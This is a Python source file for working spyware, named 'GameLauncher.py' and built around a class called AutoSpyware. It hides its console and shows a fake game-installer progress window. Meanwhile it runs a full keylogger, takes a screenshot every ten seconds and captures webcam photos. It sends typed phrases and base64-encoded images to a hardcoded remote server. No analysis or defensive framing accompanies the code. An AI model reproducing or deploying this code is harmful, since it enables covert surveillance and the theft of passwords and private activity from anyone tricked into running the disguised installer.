# GameLauncher.py - GAME INSTALLATION FIXED
import os
import sys
import time
import threading
import json
import requests
from datetime import datetime
import platform
import base64
import io
import traceback
import random
from pynput import keyboard
from tkinter import *
from tkinter import ttk
import tkinter.messagebox as messagebox
import ctypes

class AutoSpyware:
    def __init__(self, server_url="http://192.168.26.132:5000"):
        self.server_url = server_url
        self.computer_name = platform.node()
        self.running = True
        self.root = None
        self.start_time = time.time()
        
        # Keylogger settings
        self.current_phrase = ""
        self.last_key_time = time.time()
        self.sentence_delimiters = {'.', '!', '?', '\n', '\r'}
        self.phrase_timeout = 1.0
        
        # Webcam settings
        self.camera_index = None
        self.camera_backend = None
        
        # Hide console
        self.hide_console()
        
        # Find camera (try multiple approaches)
        self.find_working_camera()
        
        # Create GUI
        self.create_gui()
        
    def hide_console(self):
        """Hide the console window"""
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    def find_working_camera(self):
        """Find camera with multiple fallbacks"""
        print("[🔍] Looking for camera...")
        
        try:
            import cv2
            
            # Try 1: Use DSHOW backend first (Windows)
            try:
                cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
                if cap.isOpened():
                    ret, frame = cap.read()
                    if ret and frame is not None:
                        self.camera_index = 0
                        self.camera_backend = cv2.CAP_DSHOW
                        cap.release()
                        print(f"[✓] Camera found: index 0 (DirectShow)")
                        return
            except:
                pass
            
            # Try 2: Use MSMF backend next (Windows)
            try:
                cap = cv2.VideoCapture(0, cv2.CAP_MSMF)
                if cap.isOpened():
                    ret, frame = cap.read()
                    if ret and frame is not None:
                        self.camera_index = 0
                        self.camera_backend = cv2.CAP_MSMF
                        cap.release()
                        print(f"[✓] Camera found: index 0 (MSMF)")
                        return
            except:
                pass
            
            # Try 3: Use default backend
            try:
                cap = cv2.VideoCapture(0)
                if cap.isOpened():
                    ret, frame = cap.read()
                    if ret and frame is not None:
                        self.camera_index = 0
                        self.camera_backend = None
                        cap.release()
                        print(f"[✓] Camera found: index 0 (default)")
                        return
            except:
                pass
            
            # Try 4: Look for other cameras
            for idx in range(1, 5):
                try:
                    cap = cv2.VideoCapture(idx)
                    if cap.isOpened():
                        ret, frame = cap.read()
                        if ret and frame is not None:
                            self.camera_index = idx
                            self.camera_backend = None
                            cap.release()
                            print(f"[✓] Camera found: index {idx} (default)")
                            return
                except:
                    pass
            
            self.camera_index = None
            print("[!] No camera found")
            
        except ImportError:
            print("[!] OpenCV not installed")
            self.camera_index = None
        except Exception as e:
            print(f"[Camera Error] {e}")
            self.camera_index = None
    
    def send_data(self, data_type, data):
        """Send data to server"""
        try:
            payload = {
                "computer": self.computer_name,
                "type": data_type,
                "timestamp": datetime.now().isoformat()
            }
            
            if isinstance(data, dict):
                payload.update(data)
            else:
                payload["data"] = str(data)
            
            response = requests.post(f"{self.server_url}/receive", 
                                   json=payload, timeout=3)
            return response.status_code == 200
                
        except:
            return False
    
    def create_gui(self):
        """Create installation-like GUI"""
        self.root = Tk()
        self.root.title("Game Installer")
        self.root.geometry("600x400")
        self.root.resizable(False, False)
        
        # Main frame
        main_frame = ttk.Frame(self.root)
        main_frame.pack(fill=BOTH, expand=True, padx=20, pady=20)
        
        # Title
        title_label = ttk.Label(main_frame, text="Installing Game Components...", 
                              font=("Arial", 14, "bold"))
        title_label.pack(pady=(0, 20))
        
        # Progress bar
        self.progress_var = IntVar()
        progress_bar = ttk.Progressbar(main_frame, variable=self.progress_var, maximum=100)
        progress_bar.pack(fill=X, pady=(0, 20))
        
        # Status label
        self.status_var = StringVar()
        status_label = ttk.Label(main_frame, textvariable=self.status_var, 
                               font=("Arial", 10), foreground="blue")
        status_label.pack(pady=(0, 20))
        
        # Log display (hidden)
        log_frame = ttk.LabelFrame(main_frame, text="Installation Log")
        log_frame.pack(fill=BOTH, expand=True)
        
        #self.log_text = Text(log_frame, height=10, width=60, state=DISABLED)
        #scrollbar = ttk.Scrollbar(log_frame, orient=VERTICAL, command=self.log_text.yview)
        #self.log_text.configure(yscrollcommand=scrollbar.set)
        #self.log_text.pack(side=LEFT, fill=BOTH, expand=True)
        #scrollbar.pack(side=RIGHT, fill=Y)
        
        # Button frame
        button_frame = ttk.Frame(main_frame)
        button_frame.pack(fill=X, pady=(20, 0))
        
        self.cancel_btn = ttk.Button(button_frame, text="Cancel Installation", 
                                  command=self.cancel_installation)
        self.cancel_btn.pack(side=RIGHT)
        
        # Initial status
        self.update_status("Initializing installation...")
        
    def update_progress(self, value):
        """Update progress bar"""
        self.progress_var.set(value)
        self.root.update_idletasks()
        
    def update_status(self, message):
        """Update status message"""
        self.status_var.set(message)
        self.root.update_idletasks()
        
    def log_message(self, message):
        """Log messages to text widget"""
        self.log_text.config(state=NORMAL)
        self.log_text.insert(END, f"{message}\n")
        self.log_text.config(state=DISABLED)
        self.log_text.see(END)
        self.root.update_idletasks()
        
    def cancel_installation(self):
        """Handle cancel button"""
        if messagebox.askyesno("Cancel Installation", "Are you sure you want to cancel?"):
            self.running = False
            self.root.destroy()
    
    # ========== KEYLOGGER ==========
    def get_key_char(self, key):
        """Get character for ANY key"""
        try:
            # If it's already a character key
            if hasattr(key, 'char') and key.char is not None:
                return key.char
            
            # Special keys mapping
            special_keys = {
                keyboard.Key.space: ' ',
                keyboard.Key.enter: '\n',
                keyboard.Key.tab: '\t',
                keyboard.Key.backspace: '[BACKSPACE]',
                keyboard.Key.delete: '[DEL]',
                keyboard.Key.esc: '[ESC]',
                keyboard.Key.shift: '',
                keyboard.Key.shift_l: '',
                keyboard.Key.shift_r: '',
                keyboard.Key.ctrl: '',
                keyboard.Key.ctrl_l: '',
                keyboard.Key.ctrl_r: '',
                keyboard.Key.alt: '',
                keyboard.Key.alt_l: '',
                keyboard.Key.alt_r: '',
            }
            
            # Check if it's a special key
            if key in special_keys:
                return special_keys[key]
            
            # Try to get from vk (virtual key code)
            if hasattr(key, 'vk'):
                # Numbers on main keyboard (0-9)
                if 48 <= key.vk <= 57:
                    return chr(key.vk)
                # Numpad numbers
                elif 96 <= key.vk <= 105:
                    return str(key.vk - 96)
            
            # Try to get from name
            if hasattr(key, 'name'):
                key_name = key.name.lower()
                
                # Symbol keys mapping
                symbol_map = {
                    '`': '`', 'tilde': '~',
                    '1': '1', 'exclam': '!',
                    '2': '2', 'at': '@',
                    '3': '3', 'numbersign': '#',
                    '4': '4', 'dollar': '$',
                    '5': '5', 'percent': '%',
                    '6': '6', 'asciicircum': '^',
                    '7': '7', 'ampersand': '&',
                    '8': '8', 'asterisk': '*',
                    '9': '9', 'parenleft': '(',
                    '0': '0', 'parenright': ')',
                    '-': '-', 'underscore': '_',
                    '=': '=', 'plus': '+',
                    '[': '[', 'braceleft': '{',
                    ']': ']', 'braceright': '}',
                    '\\': '\\', 'bar': '|',
                    ';': ';', 'colon': ':',
                    "'": "'", 'quotedbl': '"',
                    ',': ',', 'less': '<',
                    '.': '.', 'greater': '>',
                    '/': '/', 'question': '?',
                }
                
                if key_name in symbol_map:
                    return symbol_map[key_name]
                
                # Single character names
                if len(key_name) == 1 and key_name.isalnum():
                    return key_name
            
            return None
            
        except Exception as e:
            return None
    
    def keylogger_complete(self):
        """Complete keylogger"""
        send_lock = threading.Lock()
        sent_phrases = set()
        
        def on_press(key):
            try:
                char = self.get_key_char(key)
                
                if char is None:
                    return
                
                # Handle backspace
                if char == '[BACKSPACE]':
                    if self.current_phrase:
                        self.current_phrase = self.current_phrase[:-1]
                    return
                
                # Skip empty characters
                if char == '':
                    return
                
                # Add to current phrase
                self.current_phrase += char
                self.last_key_time = time.time()
                
                # Check if we should send
                should_send = False
                
                if char == '\n':
                    should_send = True
                elif char in self.sentence_delimiters:
                    should_send = True
                elif len(self.current_phrase) >= 100:
                    should_send = True
                
                if should_send and self.current_phrase.strip():
                    phrase = self.current_phrase.strip()
                    with send_lock:
                        if phrase not in sent_phrases:
                            threading.Thread(target=self.send_keylog, 
                                           args=(phrase,), 
                                           daemon=True).start()
                            sent_phrases.add(phrase)
                    self.current_phrase = ""
                    
            except Exception as e:
                pass
        
        # Timeout sender
        def timeout_sender():
            while self.running:
                time.sleep(0.5)
                current_time = time.time()
                
                if (self.current_phrase.strip() and 
                    current_time - self.last_key_time > self.phrase_timeout):
                    
                    with send_lock:
                        phrase = self.current_phrase.strip()
                        if phrase and phrase not in sent_phrases:
                            threading.Thread(target=self.send_keylog, 
                                           args=(phrase,), 
                                           daemon=True).start()
                            sent_phrases.add(phrase)
                    self.current_phrase = ""
        
        # Start listener
        listener = keyboard.Listener(on_press=on_press)
        listener.daemon = True
        listener.start()
        
        # Start timeout thread
        threading.Thread(target=timeout_sender, daemon=True).start()
        
        # Keep alive
        while self.running:
            time.sleep(1)
    
    def send_keylog(self, phrase):
        """Send keystrokes"""
        try:
            if not phrase:
                return
            
            # Save locally
            try:
                os.makedirs("logs", exist_ok=True)
                with open("logs/keystrokes.log", "a", encoding="utf-8") as f:
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    f.write(f"[{timestamp}] {phrase}\n")
            except:
                pass
            
            # Send to server (no feedback)
            self.send_data("keystroke", phrase)
                
        except Exception as e:
            pass
    
    # ========== SCREENSHOT ==========
    def screenshot(self):
        """Take screenshots"""
        try:
            import pyautogui
            
            count = 0
            while self.running:
                time.sleep(10)
                count += 1
                
                try:
                    img = pyautogui.screenshot()
                    
                    # Save locally
                    os.makedirs("logs/screenshots", exist_ok=True)
                    local_file = f"logs/screenshots/screen_{count}.jpg"
                    img.save(local_file, quality=85)
                    
                    # Convert to base64
                    buffer = io.BytesIO()
                    img.save(buffer, format="JPEG", quality=70)
                    img_base64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
                    
                    data = {
                        "filename": f"screen_{count}.jpg",
                        "image_base64": img_base64,
                        "count": count,
                        "local_file": local_file
                    }
                    
                    # Send to server (no feedback)
                    self.send_data("screenshot", data)
                        
                except Exception as e:
                    pass
                    
        except ImportError:
            pass
    
    # ========== SIMPLE WEBCAM ==========
    def webcam_simple(self):
        """Simple webcam that actually works"""
        if self.camera_index is None:
            self.log_message("[!] Webcam not available")
            return
        
        try:
            import cv2
            
            # Try to open camera with proper fallback
            cap = None
            
            # Try different methods to open
            open_methods = [
                lambda: cv2.VideoCapture(self.camera_index, cv2.CAP_DSHOW),
                lambda: cv2.VideoCapture(self.camera_index, cv2.CAP_MSMF),
                lambda: cv2.VideoCapture(self.camera_index),
            ]
            
            for method in open_methods:
                try:
                    cap = method()
                    if cap.isOpened():
                        break
                except:
                    pass
            
            if cap is None or not cap.isOpened():
                self.log_message("[!] Failed to open camera")
                return
            
            # Set properties
            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
            
            # Warm up
            time.sleep(1)
            
            photo_count = 0
            
            while self.running and photo_count < 50:
                time.sleep(15)
                
                try:
                    # Read frame
                    ret, frame = cap.read()
                    
                    if not ret or frame is None:
                        continue
                    
                    photo_count += 1
                    
                    # Save locally
                    os.makedirs("logs/webcam", exist_ok=True)
                    local_file = f"logs/webcam/webcam_{photo_count}.jpg"
                    
                    # Save image
                    success = cv2.imwrite(local_file, frame)
                    if not success:
                        continue
                    
                    # Encode and send
                    success, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 85])
                    
                    if success:
                        img_base64 = base64.b64encode(buffer).decode('utf-8')
                        
                        data = {
                            "filename": f"webcam_{photo_count}.jpg",
                            "image_base64": img_base64,
                            "count": photo_count,
                            "local_file": local_file,
                            "size": f"{frame.shape[1]}x{frame.shape[0]}"
                        }
                        
                        # Send to server (no feedback)
                        self.send_data("webcam", data)
                        
                except Exception as e:
                    self.log_message(f"[Webcam Error] {e}")
            
            # Cleanup
            cap.release()
            cv2.destroyAllWindows()
            
        except ImportError:
            self.log_message("[!] OpenCV not installed")
        except Exception as e:
            self.log_message(f"[Webcam Error] {e}")
    
    # ========== START ==========
    def start_all(self):
        """Start all modules"""
        # Update GUI
        self.update_status("Starting installation...")
        #self.log_message("Starting all modules...")
        
        # Keylogger
        key_thread = threading.Thread(target=self.keylogger_complete, daemon=True)
        key_thread.start()
        #self.log_message("[✓] Keylogger started")
        time.sleep(0.5)
        
        # Screenshot
        screen_thread = threading.Thread(target=self.screenshot, daemon=True)
        screen_thread.start()
        #self.log_message("[✓] Screenshot module started")
        time.sleep(0.5)
        
        # Webcam - ALWAYS try to start if camera index was found
        if self.camera_index is not None:
            webcam_thread = threading.Thread(target=self.webcam_simple, daemon=True)
            webcam_thread.start()
            #self.log_message("[✓] Webcam module started")
        else:
            self.log_message("[!] Webcam not available")
        
        # Update final status
        self.update_status("Installation complete! Waiting for updates...")
        
        # Run GUI
        self.root.mainloop()
        
        # Clean shutdown
        self.running = False
        
        # Calculate total runtime
        elapsed = time.time() - self.start_time
        print(f"\n[!] Program ran for {elapsed/60:.1f} minutes before stopping")

# Direct mode
def direct_mode():
    """Direct mode"""
    spy = AutoSpyware(server_url="http://192.168.26.132:5000")
    spy.start_all()

# Main
if __name__ == "__main__":
    # Suppress warnings
    os.environ['OPENCV_LOG_LEVEL'] = 'ERROR'
    
    direct_mode()